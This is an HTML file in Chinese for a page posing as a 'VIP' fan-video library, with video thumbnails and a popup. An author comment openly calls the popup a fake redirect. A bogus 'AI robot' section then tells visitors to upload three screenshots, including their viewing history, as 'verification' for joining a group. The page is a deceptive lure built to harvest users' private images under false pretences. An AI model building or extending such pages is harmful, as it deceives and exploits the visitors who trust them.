<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>UDD.TAX VIP视频库</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <h1>UDD.TAX</h1>
  <p class="subtitle">全网最全同人视频库 · 每日更新 · VIP专享</p>

  <div class="grid">
    <div class="item" data-app="抖音">
      <img src="https://via.placeholder.com/300x200/ff3b30/000000?text=枫与铃" alt="枫与铃">
      <div class="title">枫与铃1~3部</div>
      <div class="meta">58分钟 · 9.8 ★ <span class="vip">VIP</span></div>
    </div>
    <div class="item" data-app="快手">
      <img src="https://via.placeholder.com/300x200/ff3b30/000000?text=催眠指导" alt="催眠指导">
      <div class="title">催眠指导系列</div>
      <div class="meta">21分钟 · 8.7 ★ <span class="vip">VIP</span></div>
    </div>
    <!-- 加更多：复制上面 div 就行 -->
  </div>

  <!-- 假跳转弹窗 -->
  <div id="gate" class="overlay">
    <div class="box">
      <h3>资源加载中...</h3>
      <p>即将跳转 <span id="appName">抖音</span> 获取完整版</p>
      <button onclick="enter()">立即跳转 →</button>
    </div>
  </div>

  <!-- AI机器人页面 -->
  <div id="aiPage" class="page">
    <h3>资源获取成功！</h3>
    <p>请按要求发 <strong>3张截图</strong> 给下方AI机器人<br>验证通过后自动拉你进群自取</p>

    <div class="chat">
      <div class="bot">AI机器人 在线</div>
      <div class="tip">请一次性发3张截图（观看记录+本页截图均可）</div>

      <div id="preview"></div>

      <input type="file" id="picker" accept="image/*" multiple style="display:none">
      <button onclick="document.getElementById('picker').click()" class="uploadBtn">
        点击上传截图（一次选3张）
      </button>

      <div id="messages"></div>
    </div>
    <button onclick="back()" class="back">← 返回首页</button>
  </div>

  <script src="script.js"></script>
</body>
</html>
